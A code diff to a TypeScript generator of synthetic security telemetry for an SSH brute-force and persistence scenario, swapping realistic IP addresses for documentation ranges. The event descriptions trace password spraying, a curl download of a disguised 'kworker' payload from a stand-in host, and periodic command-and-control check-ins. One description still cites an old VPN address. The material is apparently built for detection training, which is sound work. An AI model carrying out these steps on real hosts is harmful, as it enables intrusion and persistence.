@@ -32,13 +32,13 @@ export function linuxSshPersistenceScenarioEvents() {
   // Story-specific infrastructure, none of these addresses appear in another storyline.
   const attacker = {
     // Two guessing nodes: one spraying names that do not exist, one working the real account.
-    guessA: "176.111.174.26",
-    guessB: "92.118.39.73",
+    guessA: "203.0.113.26",
+    guessB: "203.0.113.101",
     // The address that actually logs in. It appears in NONE of the failure records.
-    success: "46.161.27.119",
-    payloadHost: "147.45.112.38",
+    success: "203.0.113.119",
+    payloadHost: "203.0.113.38",
     // The one hosting-provider address the dropped binary keeps opening TLS sessions to.
-    checkin: "38.180.62.144",
+    checkin: "203.0.113.144",
   };
 
   // The legitimate nightly backup's object-storage repository (benign control).
@@ -60,7 +60,7 @@ export function linuxSshPersistenceScenarioEvents() {
   // FortiGate traffic row. Inbound rows are the published SSH port (VIP, DNAT to the host);
   // outbound rows go through the catch-all policy. Sessions that have ended are "close" rows
   // with volume and duration; a session still open is an "accept" row.
-  const SSH_VIP = "212.150.74.18";
+  const SSH_VIP = "192.0.2.62";
   const fgRow = (id: string, ts: string, o: {
     src: string; srcport: string; dst?: string; dstport?: string; outbound?: boolean; action: "accept" | "close";
     service?: string; srccountry?: string; dstcountry?: string; sent?: number; rcvd?: number; duration?: number; description: string;
@@ -109,10 +109,10 @@ export function linuxSshPersistenceScenarioEvents() {
       vendor: "Cisco AnyConnect",
       event_type: "vpn_login",
       user_email: "d.okonkwo@northwind-logistics.io",
-      src_ip: "5.29.121.77",
+      src_ip: "198.51.100.77",
       severity: "informational",
       description:
-        "d.okonkwo connected to the Northwind remote-access VPN from 5.29.121.77 and was assigned 10.99.3.21. The gateway VPN-GW-01 egresses from the public address 82.166.44.9.",
+        "d.okonkwo connected to the Northwind remote-access VPN from 198.51.100.77 and was assigned 10.99.3.21. The gateway VPN-GW-01 egresses from the public address 82.166.44.9.",
       raw: {
         "event.action": "vpn-session-established",
         "cisco.asa.message_id": "722022",
@@ -120,12 +120,12 @@ export function linuxSshPersistenceScenarioEvents() {
         "cisco.asa.tunnel_group": "NW-RA-VPN",
         "cisco.asa.group_policy": "GP-NW-ADMINS",
         "cisco.asa.session_type": "SSL",
-        "cisco.asa.public_ip": "5.29.121.77",
+        "cisco.asa.public_ip": "198.51.100.77",
         "cisco.asa.assigned_ip": "10.99.3.21",
         "cisco.asa.client_version": "Cisco Secure Client 5.1.2.42",
         "cisco.asa.session_id": "551907",
         "observer.name": "VPN-GW-01",
-        "observer.ip": "82.166.44.9",
+        "observer.ip": "192.0.2.60",
         "event.outcome": "success",
       },
     },
@@ -140,7 +140,7 @@ export function linuxSshPersistenceScenarioEvents() {
       hostname: host.name,
       user_email: "d.okonkwo@northwind-logistics.io",
       user_title: "Linux Systems Administrator",
-      src_ip: "82.166.44.9",
+      src_ip: "192.0.2.60",
       dst_ip: host.privateIp,
       dst_port: host.sshPort,
       protocol: "tcp",
@@ -149,14 +149,14 @@ export function linuxSshPersistenceScenarioEvents() {
       mitre_technique: "T1078",
       mitre_tactic: "Initial Access",
       description:
-        "sshd on nix-bkp-01 logged 'Accepted publickey for d.okonkwo from 82.166.44.9 port 58114', the corporate VPN egress address.",
+        "sshd on nix-bkp-01 logged 'Accepted publickey for d.okonkwo from 192.0.2.60 port 58114', the corporate VPN egress address.",
       fp_explanation:
-        "This is a legitimate admin session and the control case for the auth log. Three things separate it from the login at 22:38: the method is publickey (a key cannot be guessed, so no password campaign can produce this line), the source is the corporate VPN egress rather than a hosting-provider address, and there is not a single failed authentication from 82.166.44.9 anywhere in the log. Alerting on 'SSH login to an internet-exposed host' alone flags this session and is wrong.",
+        "This is a legitimate admin session and the control case for the auth log. Three things separate it from the login at 22:38: the method is publickey (a key cannot be guessed, so no password campaign can produce this line), the source is the corporate VPN egress rather than a hosting-provider address, and there is not a single failed authentication from 192.0.2.60 anywhere in the log. Alerting on 'SSH login to an internet-exposed host' alone flags this session and is wrong.",
       authentication: { method: "publickey", result: "success" },
       raw: {
         // sshd's own authpriv line, the only record that names the authentication method.
         "data.program_name": "sshd",
-        "data.srcip": "82.166.44.9",
+        "data.srcip": "192.0.2.60",
         "data.srcport": "58114",
         "data.dstport": "2202",
         "data.dstuser": "d.okonkwo",
@@ -166,7 +166,7 @@ export function linuxSshPersistenceScenarioEvents() {
         "syslog.pid": "1788",
         "syslog.hostname": host.name,
         "syslog.facility": "authpriv",
-        "event.original": `Apr 14 21:40:00 ${host.name} sshd[1788]: Accepted publickey for d.okonkwo from 82.166.44.9 port 58114 ssh2: ED25519 SHA256:q1WvR7k0mUe3xYc9hJbT2nZpLd4fA8sGoQ6iEtN5uXw`,
+        "event.original": `Apr 14 21:40:00 ${host.name} sshd[1788]: Accepted publickey for d.okonkwo from 192.0.2.60 port 58114 ssh2: ED25519 SHA256:q1WvR7k0mUe3xYc9hJbT2nZpLd4fA8sGoQ6iEtN5uXw`,
       },
     },
 
@@ -186,7 +186,7 @@ export function linuxSshPersistenceScenarioEvents() {
       mitre_technique: "T1110.001",
       mitre_tactic: "Credential Access",
       description:
-        "auditd on nix-bkp-01 recorded a failed sshd PAM authentication from 176.111.174.26 with acct=\"?\", the username tried does not exist on the host.",
+        "auditd on nix-bkp-01 recorded a failed sshd PAM authentication from 203.0.113.26 with acct=\"?\", the username tried does not exist on the host.",
       authentication: { method: "password", result: "failure" },
       raw: {
         // Linux-PAM writes acct="?" when the user is unknown (PAM_USER_UNKNOWN), the
@@ -211,7 +211,7 @@ export function linuxSshPersistenceScenarioEvents() {
 
     fgRow("lsp_02a_fw_inbound_ssh", T(31 * MIN + 3 * SEC), {
       src: attacker.guessA, srcport: "44118", action: "close", srccountry: "Russian Federation", sent: 3_944, rcvd: 3_212, duration: 3,
-      description: "Firewall closed a 3-second inbound session from 176.111.174.26:44118 to the SSH VIP on port 2202 under the Allow-SSH-2202-Inbound rule, translated to 10.40.2.15.",
+      description: "Firewall closed a 3-second inbound session from 203.0.113.26:44118 to the SSH VIP on port 2202 under the Allow-SSH-2202-Inbound rule, translated to 10.40.2.15.",
     }),
 
     // ── 3. Password guessing, the real service account ────────────────────────
@@ -253,11 +253,11 @@ export function linuxSshPersistenceScenarioEvents() {
 
     fgRow("lsp_03a_fw_inbound_ssh", T(52 * MIN + 3 * SEC), {
       src: attacker.guessB, srcport: "39562", action: "close", srccountry: "Netherlands", sent: 3_980, rcvd: 3_208, duration: 3,
-      description: "Firewall closed a 3-second inbound session from 92.118.39.73:39562 to the SSH VIP on port 2202 under the Allow-SSH-2202-Inbound rule, translated to 10.40.2.15.",
+      description: "Firewall closed a 3-second inbound session from 203.0.113.101:39562 to the SSH VIP on port 2202 under the Allow-SSH-2202-Inbound rule, translated to 10.40.2.15.",
     }),
     fgRow("lsp_03b_fw_inbound_ssh", T(58 * MIN - 2 * SEC), {
       src: attacker.success, srcport: "41772", action: "accept", srccountry: "Russian Federation",
-      description: "Firewall accepted an inbound session from 46.161.27.119:41772 to the SSH VIP on port 2202 under the Allow-SSH-2202-Inbound rule, translated to 10.40.2.15.",
+      description: "Firewall accepted an inbound session from 203.0.113.119:41772 to the SSH VIP on port 2202 under the Allow-SSH-2202-Inbound rule, translated to 10.40.2.15.",
     }),
 
     // ── 4. The login that worked, sshd's line names the method ────────────────
@@ -276,7 +276,7 @@ export function linuxSshPersistenceScenarioEvents() {
       mitre_technique: "T1078",
       mitre_tactic: "Initial Access",
       description:
-        "sshd on nix-bkp-01 logged 'Accepted password for svc-backup from 46.161.27.119 port 41772'.",
+        "sshd on nix-bkp-01 logged 'Accepted password for svc-backup from 203.0.113.119 port 41772'.",
       authentication: { method: "password", result: "success" },
       raw: {
         "data.program_name": "sshd",
@@ -290,7 +290,7 @@ export function linuxSshPersistenceScenarioEvents() {
         "syslog.pid": "1859",
         "syslog.hostname": host.name,
         "syslog.facility": "authpriv",
-        "event.original": `Apr 14 22:38:00 ${host.name} sshd[1859]: Accepted password for svc-backup from 46.161.27.119 port 41772 ssh2`,
+        "event.original": `Apr 14 22:38:00 ${host.name} sshd[1859]: Accepted password for svc-backup from 203.0.113.119 port 41772 ssh2`,
       },
     },
 
@@ -310,7 +310,7 @@ export function linuxSshPersistenceScenarioEvents() {
       mitre_technique: "T1078",
       mitre_tactic: "Initial Access",
       description:
-        "auditd USER_LOGIN on nix-bkp-01: login id=1004 from 46.161.27.119 opened session 41 on /dev/pts/0, res=success.",
+        "auditd USER_LOGIN on nix-bkp-01: login id=1004 from 203.0.113.119 opened session 41 on /dev/pts/0, res=success.",
       authentication: { method: "password", result: "success" },
       raw: {
         // USER_LOGIN is written when the session OPENS, after pam_loginuid has set the
@@ -439,7 +439,7 @@ export function linuxSshPersistenceScenarioEvents() {
       mitre_technique: "T1105",
       mitre_tactic: "Command and Control",
       description:
-        "svc-backup ran curl on nix-bkp-01 with parent bash: GET http://147.45.112.38/updates/kworker over plain HTTP, output written to /home/svc-backup/.cache/.fontconfig/kworker.",
+        "svc-backup ran curl on nix-bkp-01 with parent bash: GET http://203.0.113.38/updates/kworker over plain HTTP, output written to /home/svc-backup/.cache/.fontconfig/kworker.",
       process: {
         name: "curl",
         pid: 1934,
@@ -483,7 +483,7 @@ export function linuxSshPersistenceScenarioEvents() {
     fgRow("lsp_08a_fw_payload_http", T(64 * MIN + 9 * SEC), {
       src: host.privateIp, srcport: "49830", dst: attacker.payloadHost, dstport: "80", outbound: true, action: "close", service: "HTTP", dstcountry: "Russian Federation",
       sent: 318, rcvd: 2_872_104, duration: 8,
-      description: "Firewall closed an 8-second outbound HTTP session from nix-bkp-01 (10.40.2.15:49830) to 147.45.112.38:80 under the Allow-Outbound-Internet rule, 318 bytes sent and 2,872,104 received.",
+      description: "Firewall closed an 8-second outbound HTTP session from nix-bkp-01 (10.40.2.15:49830) to 203.0.113.38:80 under the Allow-Outbound-Internet rule, 318 bytes sent and 2,872,104 received.",
     }),
 
     // ── 9. Making it executable ────────────────────────────────────────────────
@@ -631,7 +631,7 @@ export function linuxSshPersistenceScenarioEvents() {
       mitre_technique: "T1071.001",
       mitre_tactic: "Command and Control",
       description:
-        "Falcon network event on nix-bkp-01: kworker opened a TCP connection from 10.40.2.15:51734 to 38.180.62.144:443.",
+        "Falcon network event on nix-bkp-01: kworker opened a TCP connection from 10.40.2.15:51734 to 203.0.113.144:443.",
       process: {
         name: "kworker",
         pid: 1974,
@@ -673,7 +673,7 @@ export function linuxSshPersistenceScenarioEvents() {
       mitre_technique: "T1071.001",
       mitre_tactic: "Command and Control",
       description:
-        "Firewall closed a 3-second session from nix-bkp-01 (10.40.2.15:51734) to 38.180.62.144:443 under the Allow-Outbound-Internet rule, 1,912 bytes sent, 4,388 received.",
+        "Firewall closed a 3-second session from nix-bkp-01 (10.40.2.15:51734) to 203.0.113.144:443 under the Allow-Outbound-Internet rule, 1,912 bytes sent, 4,388 received.",
       network: { bytes_out: 1_912, bytes_in: 4_388 },
       raw: {
         "data.type": "traffic",
@@ -716,7 +716,7 @@ export function linuxSshPersistenceScenarioEvents() {
       mitre_technique: "T1071.001",
       mitre_tactic: "Command and Control",
       description:
-        "Five minutes later the firewall closed another 3-second session from nix-bkp-01 (10.40.2.15:51790) to 38.180.62.144:443 under the same rule, 1,904 bytes sent, 4,388 received.",
+        "Five minutes later the firewall closed another 3-second session from nix-bkp-01 (10.40.2.15:51790) to 203.0.113.144:443 under the same rule, 1,904 bytes sent, 4,388 received.",
       network: { bytes_out: 1_904, bytes_in: 4_388 },
       raw: {
         "data.type": "traffic",
